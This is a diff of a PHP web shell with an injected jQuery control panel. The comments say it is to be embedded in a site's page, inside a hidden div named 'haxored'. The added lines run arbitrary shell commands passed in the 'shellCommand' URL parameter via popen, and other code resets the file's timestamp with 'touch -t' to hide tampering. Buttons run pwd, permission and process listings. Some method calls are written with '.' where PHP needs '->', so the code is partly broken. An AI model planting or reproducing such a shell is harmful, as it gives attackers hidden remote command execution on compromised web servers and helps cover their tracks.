@@ -1,10 +1,3 @@
-<!-- Above here, should be the end of the content in the <body> tag -->
-<!-- Place the entire content in a <div id="luserContent"> tag  -->
-
-<!-- Don't include this jQuery API if it's already included on the site -->
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-<div id="haxored" hidden="true" style='margin: 0px; padding: 0px; width: 100%; height: 100%; color: #fff; background-color: #161616;'>
-
 <?php
 	class UserInterface
 	{
@@ -36,14 +29,22 @@
 			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
 		}
 	}
+ 
+	if(isset($_GET['shellCommand'])) {
+		$myCommand = $_GET['shellCommand'];
+		$shellOut = $userInterface.doCommand($myCommand);
+	}
+?>
 
+<?php if (isset($_GET['command'])): ?>
+<?php
 	$userInterface = new UserInterface();
 	if(isset($_GET['command'])) {
 		$command = $_GET['command'];
 		switch($command) {
 			case "pwd":
-				$pwd = $userInterface.getPwd();
-				echo $pwd;
+				#$pwd = $userInterface.getPwd();
+				echo "pwd";
 				break;
 			case "perm":
 				$permissions = $userInterface.getPermissions();
@@ -53,11 +54,12 @@
 				break;
 		}
 	}
-	if(isset($_GET['shellCommand'])) {
-		$myCommand = $_GET['shellCommand'];
-		$shellOut = $userInterface.doCommand($myCommand);
-	}
 ?>
+<?php else: ?>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<div id="haxored" hidden="true" style='margin: 0px; padding: 0px; width: 100%; height: 100%; color: #fff; background-color: #161616;'>
+
 <style rel="stylesheet" type="text/css">
 #XmenuNav {
 	background-color: #161616;
@@ -85,8 +87,7 @@
 #XmenuNav li button {
 	height: 100%;
 	border: 0px;
-	padding: 0 10px;
-	
+	padding: 0 10px;	
 	float: left;
 	color: #605e56;
 	background-color: #161616;
@@ -146,7 +147,7 @@
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
-		<form action="#" id="XmenuForm">
+		<form action="" id="XmenuForm">
 		<ul class="XmenuOptions">
 			<li><button id="home"> Home </button></li>
 			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
@@ -174,18 +175,40 @@
 			</div>
 		<script type="text/javascript">
 $(document).ready( function() {
-	$("#XmenuForm").on('click', function(e) {
-		e.preventDefault();
+
+	function submit(command) {
 		$.ajax({
 		url: "http://127.0.0.1/shell.php",
 			type: "GET",
-			data: $(this).serialize(),
+			data: {"command": command},
 			success: function(data) {
 				alert(data);
 			}
 		});
-	});
+	}
 	
+
+	var request = "";
+
+	
+	$("#XbuttonPwd").on('click', function(e) {
+		e.preventDefault();
+		request = "pwd";
+		submit(request);
+	});
+
+	$("#XbuttonPerm").on('click', function(e) {
+		e.preventDefault();
+		request = "perm";
+		submit(request);
+	});
+
+	$("#XbuttonPs").on('click', function(e) {
+		e.preventDefault();
+		request = "ps";
+		submit(request);
+	});
+
 	var xmenuform = document.getElementById("XmenuForm");
 	xmenuform.addEventListener("keydown", function(e) {
 		if (e.which == 13) {
@@ -210,3 +233,5 @@ $(document).ready( function() {
 	});
 </script>
 <!-- Below here should be the closing </body> tag -->
+<?php endif; ?>
+
